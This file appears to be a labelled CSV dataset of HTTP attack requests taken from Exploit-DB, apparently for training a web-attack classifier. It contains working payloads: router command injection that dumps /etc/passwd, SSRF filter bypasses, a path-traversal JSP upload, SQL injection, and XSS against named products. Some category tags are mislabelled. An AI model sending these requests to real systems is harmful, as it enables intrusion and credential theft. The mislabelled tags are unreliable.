"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_luongvd_000001","1","exploitdb","https://www.exploit-db.com/exploits/52508","POST","https://192.168.0.1/boafrm/formSysCmd","/boafrm/formSysCmd","","[[""Host"", ""192.168.0.1""], [""Authorization"", ""Basic YWRtaW46YWRtaW4=""], [""Content-Type"", ""application/x-www-form-urlencoded""]]","submit-url=%2Fsyscmd.htm&sysCmd=ping&sysCmdType=ping&checkNum=5&sysHost=google.com%7Ccat%20/etc/passwd&apply=Apply

Response Extract:
root:XEOFcsRJLyXbQ:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null

References:
https://www.dlink.com
https://dlinkmea.com/index.php/product/details?det=T082aVdUWUFNR2FRblBBQUxMWlVTZz09","POST /boafrm/formSysCmd HTTP/1.1
Host: 192.168.0.1
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/x-www-form-urlencoded

submit-url=%2Fsyscmd.htm&sysCmd=ping&sysCmdType=ping&checkNum=5&sysHost=google.com%7Ccat%20/etc/passwd&apply=Apply

Response Extract:
root:XEOFcsRJLyXbQ:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null

References:
https://www.dlink.com
https://dlinkmea.com/index.php/product/details?det=T082aVdUWUFNR2FRblBBQUxMWlVTZz09","lfi"
"pos_luongvd_000002","1","exploitdb","https://www.exploit-db.com/exploits/52496","GET","https://10.10.0.28:3005/check-url?url=http://10.10.0.28:3005","/check-url","url=http://10.10.0.28:3005","[[""Host"", ""10.10.0.28:3005""], [""Content-Len gth"", ""2""], [""Content-Length"", ""2""]]","
HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 33
ETag: W/""21-6j4oICVQ6Z+6nx0WETDHqqeeklM""
Date: Sun, 09 Nov 2025 09:29:34 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{""error"":""localhost not allowed""}

-----------------------------------------------------------------

# Exploit","GET /check-url?url=http://10.10.0.28:3005 HTTP/1.1
Host: 10.10.0.28:3005
Content-Len gth: 2
Content-Length: 2


HTTP/1.1 403 Forbidden
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 33
ETag: W/""21-6j4oICVQ6Z+6nx0WETDHqqeeklM""
Date: Sun, 09 Nov 2025 09:29:34 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{""error"":""localhost not allowed""}

-----------------------------------------------------------------

# Exploit","ssrf"
"pos_luongvd_000003","1","exploitdb","https://www.exploit-db.com/exploits/52496","GET","https://10.10.0.28:3005/check-url?url=http://[::ffff:7f00:1]:3005","/check-url","url=http://[::ffff:7f00:1]:3005","[[""Host"", ""10.10.0.28:3005""], [""Content-Len gth"", ""2""], [""Content-Length"", ""2""]]","
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 306
ETag: W/""132-0QnJdvy6r/DgvnNvBs+i8eLbOLc""
Date: Sun, 09 Nov 2025 09:29:28 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{""message"":""Express server running"",""usage"":""GET /check-url?url=
https://10.10.0.28:3005"",""examples"":[""GET /check-url?url=
https://httpbin.org/json"",""GET /check-url?url=http://localhost:8080"",""GET
/check-url?url=https://google.com""],""endpoints"":[""GET /"",""GET
/check-url?url=<URL>"",""GET /secret""],""port"":3005}

```

# Reproduce:
[href](
https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2025/CVE-2025-9960
)

# Demo:
[href](https://www.patreon.com/posts/cve-2025-9960-is-143172786)

# Time spent:
03:15:00


--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

--

System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstorm.news/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>","GET /check-url?url=http://[::ffff:7f00:1]:3005 HTTP/1.1
Host: 10.10.0.28:3005
Content-Len gth: 2
Content-Length: 2


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 306
ETag: W/""132-0QnJdvy6r/DgvnNvBs+i8eLbOLc""
Date: Sun, 09 Nov 2025 09:29:28 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{""message"":""Express server running"",""usage"":""GET /check-url?url=
https://10.10.0.28:3005"",""examples"":[""GET /check-url?url=
https://httpbin.org/json"",""GET /check-url?url=http://localhost:8080"",""GET
/check-url?url=https://google.com""],""endpoints"":[""GET /"",""GET
/check-url?url=<URL>"",""GET /secret""],""port"":3005}

```

# Reproduce:
[href](
https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2025/CVE-2025-9960
)

# Demo:
[href](https://www.patreon.com/posts/cve-2025-9960-is-143172786)

# Time spent:
03:15:00


--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://www.asc3t1c-nu11secur1ty.com/>

--

System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstorm.news/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
                          nu11secur1ty <http://nu11secur1ty.com/>","ssrf"
"pos_luongvd_000004","1","exploitdb","https://www.exploit-db.com/exploits/52500","GET","http://target/shell.php?cmd=cat%20/etc/passwd","/shell.php","cmd=cat%20/etc/passwd","[]","","http://target/shell.php?cmd=cat%20/etc/passwd","lfi"
"pos_luongvd_000005","1","exploitdb","https://www.exploit-db.com/exploits/52490","POST","/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp&fileId=2","/seeyon/wpsAssistServlet","flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp&fileId=2","[[""Host"", """"], [""Content-Type"", ""multipart/form-data; boundary=......""], [""Accept-Encoding"", ""gzip""]]","--......
Content-Disposition: form-data; name=""upload""; filename=""123.xls""
Content-Type: application/vnd.ms-excel

<% out.println(""HelloWorld"");%>
--.......--","POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/Hello.jsp&fileId=2 HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=......
Accept-Encoding: gzip

--......
Content-Disposition: form-data; name=""upload""; filename=""123.xls""
Content-Type: application/vnd.ms-excel

<% out.println(""HelloWorld"");%>
--.......--","sqli"
"pos_luongvd_000006","1","exploitdb","https://www.exploit-db.com/exploits/52491","GET","/render/public/..%252f%255Cczeqm5.dnslog.cn%252f%253F%252f..%252f..","/render/public/..%252f%255Cczeqm5.dnslog.cn%252f%253F%252f..%252f..","","[[""Host"", """"], [""User-Agent"", ""Mozilla/5.0 (Fedora; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0""], [""Connection"", ""close""], [""Accept-Encoding"", ""gzip""]]","","GET /render/public/..%252f%255Cczeqm5.dnslog.cn%252f%253F%252f..%252f.. HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Accept-Encoding: gzip","lfi"
"pos_luongvd_000007","1","exploitdb","https://www.exploit-db.com/exploits/52457","GET","http://mangoswebv4/install/index.php?step=%3Cscript%3Ealert","/install/index.php","step=%3Cscript%3Ealert","[]","","http://mangoswebv4/install/index.php?step=%3Cscript%3Ealert","xss"
"pos_luongvd_000008","1","exploitdb","https://www.exploit-db.com/exploits/52451","GET","https://phpmyadmin/server_privileges.php?ajax_request=true&validate_username=set&username=%27%20OR%20%271%27%3D%271%27%20--%20","/server_privileges.php","ajax_request=true&validate_username=set&username=%27%20OR%20%271%27%3D%271%27%20--%20","[[""Host"", ""phpmyadmin""], [""Connection"", ""close""]]","# Additional conditions:
# - The attacker must have a valid MySQL account to access the server.


Steps to Reproduce
Log in phpmyadmin.
Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie.
Observe the result.","GET /server_privileges.php?ajax_request=true&validate_username=set&username=%27%20OR%20%271%27%3D%271%27%20--%20 HTTP/1.1
Host: phpmyadmin
Connection: close

# Additional conditions:
# - The attacker must have a valid MySQL account to access the server.


Steps to Reproduce
Log in phpmyadmin.
Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie.
Observe the result.","sqli"
"pos_luongvd_000009","1","exploitdb","https://www.exploit-db.com/exploits/52442","POST","https://phpipam/app/admin/powerDNS/record-edit.php","/app/admin/powerDNS/record-edit.php","","[[""Host"", ""phpipam""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""Content-Length"", ""<calculated_length>""]]","action=add&domain_id=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

# This will execute the alert(1) script when the response is rendered in the browser.","POST /app/admin/powerDNS/record-edit.php HTTP/1.1
Host: phpipam
Content-Type: application/x-www-form-urlencoded
Content-Length: <calculated_length>

action=add&domain_id=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

# This will execute the alert(1) script when the response is rendered in the browser.","xss"
"pos_luongvd_000010","1","exploitdb","https://www.exploit-db.com/exploits/52443","GET","https://piwigo/admin.php?page=profile&user_id=' OR 1=1 --","/admin.php","page=profile&user_id=' OR 1=1 --","[[""Host"", ""piwigo""]]","Steps to Reproduce
Login as an admin user.
Send the request.
Observe the result","GET /admin.php?page=profile&user_id=' OR 1=1 --  HTTP/1.1
Host: piwigo

Steps to Reproduce
Login as an admin user.
Send the request.
Observe the result","sqli"
"pos_luongvd_000011","1","exploitdb","https://www.exploit-db.com/exploits/52441","GET","http://phpipam/app/admin/import-export/import-devices-preview.php?&filetype=anyValidFiletype&expfields=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E&importFields__%22%3E%3Cscript%3Ealert%281%29%3C/script%3E=anyValue","/app/admin/import-export/import-devices-preview.php","&filetype=anyValidFiletype&expfields=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E&importFields__%22%3E%3Cscript%3Ealert%281%29%3C/script%3E=anyValue","[]","","http://phpipam/app/admin/import-export/import-devices-preview.php?&filetype=anyValidFiletype&expfields=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E&importFields__%22%3E%3Cscript%3Ealert%281%29%3C/script%3E=anyValue","xss"
